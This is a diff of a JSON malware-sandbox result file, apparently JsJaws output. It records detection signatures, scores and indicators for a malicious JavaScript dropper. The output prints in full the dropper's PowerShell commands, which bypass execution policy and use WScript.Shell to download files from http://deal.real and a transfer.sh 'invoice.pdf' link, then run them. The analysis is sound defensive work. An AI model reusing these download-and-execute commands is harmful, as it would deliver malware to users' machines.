@@ -1,7 +1,7 @@
 {
   "extra": {
     "drop_file": false,
-    "score": 1030,
+    "score": 2572,
     "sections": [
       {
         "auto_collapse": true,
@@ -59,7 +59,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript creates an ActiveXObject\n\t\tvar gref = ActiveXObject",
+        "body": "JavaScript creates an ActiveXObject\n\t\tActiveXObject(WScript.Shell)\n\t\tvar gref = ActiveXObject",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -107,7 +107,31 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs elevated PowerShell via powershell.exe\n\t\txt6ymmvzakvzm80nm6gllm5m_jsjaws.setAttribute(\"alt\", \"powershell -Exec Bypass -NoP -C (new-object sys...",
+        "body": "JavaScript creates a new Windows Scripting Host Shell Object\n\t\tnew WScript.Shell[17]()",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "creates_wsh_object": 10
+          },
+          "signatures": {
+            "creates_wsh_object": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Signature: CreatesWshObject",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "JavaScript runs elevated PowerShell via powershell.exe\n\t\tHTMLImageElement[13].alt = (string) 'powershell -Exec Bypass -NoP -C (new-object system.net.webclien...\n\t\tHTMLImageElement[13].alt.get() => (string) 'powershell -Exec Bypass -NoP -C (new-object system.net.w...\n\t\tHTMLImageElement[13].getAttribute(alt) => (string) 'powershell -Exec Bypass -NoP -C (new-object syst...\n\t\tWScript.Shell[17].run(\"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFil...\n\t\tWScript.Shell[17].run(\"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFil...\n\t\txt6ymmvzakvzm80nm6gllm5m_jsjaws.setAttribute(\"alt\", \"powershell -Exec Bypass -NoP -C (new-object sys...",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -131,7 +155,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs PowerShell via powershell.exe\n\t\txt6ymmvzakvzm80nm6gllm5m_jsjaws.setAttribute(\"alt\", \"powershell -Exec Bypass -NoP -C (new-object sys...",
+        "body": "JavaScript runs PowerShell via powershell.exe\n\t\tHTMLImageElement[13].alt = (string) 'powershell -Exec Bypass -NoP -C (new-object system.net.webclien...\n\t\tHTMLImageElement[13].alt.get() => (string) 'powershell -Exec Bypass -NoP -C (new-object system.net.w...\n\t\tHTMLImageElement[13].getAttribute(alt) => (string) 'powershell -Exec Bypass -NoP -C (new-object syst...\n\t\tWScript.Shell[17].run(\"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFil...\n\t\tWScript.Shell[17].run(\"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFil...\n\t\txt6ymmvzakvzm80nm6gllm5m_jsjaws.setAttribute(\"alt\", \"powershell -Exec Bypass -NoP -C (new-object sys...",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -155,7 +179,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs PowerShell via powershell.exe with no profile\n\t\txt6ymmvzakvzm80nm6gllm5m_jsjaws.setAttribute(\"alt\", \"powershell -Exec Bypass -NoP -C (new-object sys...",
+        "body": "JavaScript runs PowerShell via powershell.exe with no profile\n\t\tHTMLImageElement[13].alt = (string) 'powershell -Exec Bypass -NoP -C (new-object system.net.webclien...\n\t\tHTMLImageElement[13].alt.get() => (string) 'powershell -Exec Bypass -NoP -C (new-object system.net.w...\n\t\tHTMLImageElement[13].getAttribute(alt) => (string) 'powershell -Exec Bypass -NoP -C (new-object syst...\n\t\tWScript.Shell[17].run(\"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFil...\n\t\tWScript.Shell[17].run(\"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFil...\n\t\txt6ymmvzakvzm80nm6gllm5m_jsjaws.setAttribute(\"alt\", \"powershell -Exec Bypass -NoP -C (new-object sys...",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -176,11 +200,352 @@
         "tags": {},
         "title_text": "Signature: RunsNoProfilePowerShell",
         "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "JavaScript runs PowerShell to call out to a URI\n\t\tWScript.Shell[17].run(\"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFil...\n\t\tWScript.Shell[17].run(\"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFil...",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "runs_ps1_to_download": 10
+          },
+          "signatures": {
+            "runs_ps1_to_download": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Signature: PowerShellDownloader",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "JavaScript runs code via shell\n\t\tWScript.Shell[17].run(\"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFil...\n\t\tWScript.Shell[17].run(\"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFil...",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "runs_shell": 10
+          },
+          "signatures": {
+            "runs_shell": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Signature: RunsShell",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "JavaScript attempts to sleep or schedule execution after a given delay\n\t\twindow[4].setTimeout(function(){?    var ts = document.getElementsByTagName(\"input\");?    for(var i ...",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "sleep": 10
+          },
+          "signatures": {
+            "sleep": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Signature: Sleep",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": [
+          {
+            "ioc": "transfer.sh",
+            "ioc_type": "domain"
+          },
+          {
+            "ioc": "http://deal.real",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "https://transfer.sh/get/vpiHmi/invoice.pdf",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "/get/vpiHmi/invoice.pdf",
+            "ioc_type": "uri_path"
+          }
+        ],
+        "body_config": {
+          "column_order": [
+            "ioc_type",
+            "ioc"
+          ]
+        },
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 13,
+          "score": 500,
+          "score_map": {
+            "suspicious_pwsh_url": 500
+          },
+          "signatures": {
+            "suspicious_pwsh_url": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {
+          "file": {
+            "string": {
+              "extracted": [
+                "http://deal.real"
+              ]
+            }
+          },
+          "network": {
+            "dynamic": {
+              "domain": [
+                "transfer.sh"
+              ],
+              "uri": [
+                "https://transfer.sh/get/vpiHmi/invoice.pdf"
+              ],
+              "uri_path": [
+                "/get/vpiHmi/invoice.pdf"
+              ]
+            }
+          }
+        },
+        "title_text": "Suspicious URL Downloaded by PowerShell",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": [
+          {
+            "ioc": "abc.xyz",
+            "ioc_type": "domain"
+          },
+          {
+            "ioc": "transfer.sh",
+            "ioc_type": "domain"
+          },
+          {
+            "ioc": "http://deal.real",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "https://abc.xyz/img/bg-cropped.jpg",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "https://transfer.sh/get/vpiHmi/invoice.pdf",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "/get/vpiHmi/invoice.pdf",
+            "ioc_type": "uri_path"
+          },
+          {
+            "ioc": "/img/bg-cropped.jpg",
+            "ioc_type": "uri_path"
+          }
+        ],
+        "body_config": {
+          "column_order": [
+            "ioc_type",
+            "ioc"
+          ]
+        },
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 2,
+          "score": 1,
+          "score_map": {},
+          "signatures": {}
+        },
+        "promote_to": null,
+        "tags": {
+          "file": {
+            "string": {
+              "extracted": [
+                "http://deal.real"
+              ]
+            }
+          },
+          "network": {
+            "static": {
+              "domain": [
+                "abc.xyz",
+                "transfer.sh"
+              ],
+              "uri": [
+                "https://abc.xyz/img/bg-cropped.jpg",
+                "https://transfer.sh/get/vpiHmi/invoice.pdf"
+              ],
+              "uri_path": [
+                "/get/vpiHmi/invoice.pdf",
+                "/img/bg-cropped.jpg"
+              ]
+            }
+          }
+        },
+        "title_text": "MalwareJail extracted the following IOCs",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": [
+          {
+            "ioc": "transfer.sh",
+            "ioc_type": "domain"
+          },
+          {
+            "ioc": "http://deal.real",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "https://transfer.sh/get/vpiHmi/invoice.pdf",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "/get/vpiHmi/invoice.pdf",
+            "ioc_type": "uri_path"
+          }
+        ],
+        "body_config": {
+          "column_order": [
+            "ioc_type",
+            "ioc"
+          ]
+        },
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 13,
+          "score": 1000,
+          "score_map": {
+            "wscript_pwsh_url": 500
+          },
+          "signatures": {
+            "wscript_pwsh_url": 2
+          }
+        },
+        "promote_to": null,
+        "tags": {
+          "dynamic": {
+            "process": {
+              "command_line": [
+                "powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFile('http://deal.real', 'C:\\Users\\Public\\apple.png')",
+                "powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFile('https://transfer.sh/get/vpiHmi/invoice.pdf', 'C:ProgramDatainvoice.pdf'); Start-Process 'C:ProgramDatainvoice.pdf'"
+              ]
+            }
+          },
+          "file": {
+            "string": {
+              "extracted": [
+                "http://deal.real"
+              ]
+            }
+          },
+          "network": {
+            "dynamic": {
+              "domain": [
+                "transfer.sh"
+              ],
+              "uri": [
+                "https://transfer.sh/get/vpiHmi/invoice.pdf"
+              ],
+              "uri_path": [
+                "/get/vpiHmi/invoice.pdf"
+              ]
+            }
+          }
+        },
+        "title_text": "IOCs extracted from WScript",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": [
+          {
+            "method": "get",
+            "url": "https://abc.xyz/img/bg-cropped.jpg"
+          }
+        ],
+        "body_config": {
+          "column_order": [
+            "url",
+            "method"
+          ]
+        },
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 1,
+          "score": 1,
+          "score_map": {},
+          "signatures": {}
+        },
+        "promote_to": null,
+        "tags": {
+          "network": {
+            "static": {
+              "domain": [
+                "abc.xyz"
+              ],
+              "uri": [
+                "https://abc.xyz/img/bg-cropped.jpg"
+              ],
+              "uri_path": [
+                "/img/bg-cropped.jpg"
+              ]
+            }
+          }
+        },
+        "title_text": "URLs",
+        "zeroize_on_tag_safe": false
       }
     ]
   },
   "files": {
-    "extracted": [],
+    "extracted": [
+      {
+        "name": "extracted_wscript.ps1",
+        "sha256": "f428345f405539bb165c2ecc685adf6ee6155c733c9851836dcd266b2370957c"
+      }
+    ],
     "supplementary": [
       {
         "name": "temp_javascript.js",
@@ -190,6 +555,16 @@
   },
   "results": {
     "heuristics": [
+      {
+        "attack_ids": [],
+        "heur_id": 1,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 2,
+        "signatures": []
+      },
       {
         "attack_ids": [],
         "heur_id": 3,
@@ -202,6 +577,13 @@
         "heur_id": 3,
         "signatures": [
           "append_and_click"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "creates_wsh_object"
         ]
       },
       {
@@ -224,9 +606,181 @@
         "signatures": [
           "runs_ps1_no_profile"
         ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "runs_ps1_to_download"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "runs_shell"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "sleep"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 13,
+        "signatures": [
+          "suspicious_pwsh_url"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 13,
+        "signatures": [
+          "wscript_pwsh_url"
+        ]
       }
     ],
-    "tags": {},
+    "tags": {
+      "dynamic.process.command_line": [
+        {
+          "heur_id": 13,
+          "signatures": [
+            "wscript_pwsh_url"
+          ],
+          "value": "powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFile('http://deal.real', 'C:\\Users\\Public\\apple.png')"
+        },
+        {
+          "heur_id": 13,
+          "signatures": [
+            "wscript_pwsh_url"
+          ],
+          "value": "powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFile('https://transfer.sh/get/vpiHmi/invoice.pdf', 'C:ProgramDatainvoice.pdf'); Start-Process 'C:ProgramDatainvoice.pdf'"
+        }
+      ],
+      "file.string.extracted": [
+        {
+          "heur_id": 13,
+          "signatures": [
+            "suspicious_pwsh_url"
+          ],
+          "value": "http://deal.real"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "http://deal.real"
+        },
+        {
+          "heur_id": 13,
+          "signatures": [
+            "wscript_pwsh_url"
+          ],
+          "value": "http://deal.real"
+        }
+      ],
+      "network.dynamic.domain": [
+        {
+          "heur_id": 13,
+          "signatures": [
+            "suspicious_pwsh_url"
+          ],
+          "value": "transfer.sh"
+        },
+        {
+          "heur_id": 13,
+          "signatures": [
+            "wscript_pwsh_url"
+          ],
+          "value": "transfer.sh"
+        }
+      ],
+      "network.dynamic.uri": [
+        {
+          "heur_id": 13,
+          "signatures": [
+            "suspicious_pwsh_url"
+          ],
+          "value": "https://transfer.sh/get/vpiHmi/invoice.pdf"
+        },
+        {
+          "heur_id": 13,
+          "signatures": [
+            "wscript_pwsh_url"
+          ],
+          "value": "https://transfer.sh/get/vpiHmi/invoice.pdf"
+        }
+      ],
+      "network.dynamic.uri_path": [
+        {
+          "heur_id": 13,
+          "signatures": [
+            "suspicious_pwsh_url"
+          ],
+          "value": "/get/vpiHmi/invoice.pdf"
+        },
+        {
+          "heur_id": 13,
+          "signatures": [
+            "wscript_pwsh_url"
+          ],
+          "value": "/get/vpiHmi/invoice.pdf"
+        }
+      ],
+      "network.static.domain": [
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "abc.xyz"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "abc.xyz"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "transfer.sh"
+        }
+      ],
+      "network.static.uri": [
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "https://abc.xyz/img/bg-cropped.jpg"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "https://abc.xyz/img/bg-cropped.jpg"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "https://transfer.sh/get/vpiHmi/invoice.pdf"
+        }
+      ],
+      "network.static.uri_path": [
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "/get/vpiHmi/invoice.pdf"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "/img/bg-cropped.jpg"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "/img/bg-cropped.jpg"
+        }
+      ]
+    },
     "temp_submission_data": {}
   }
 }
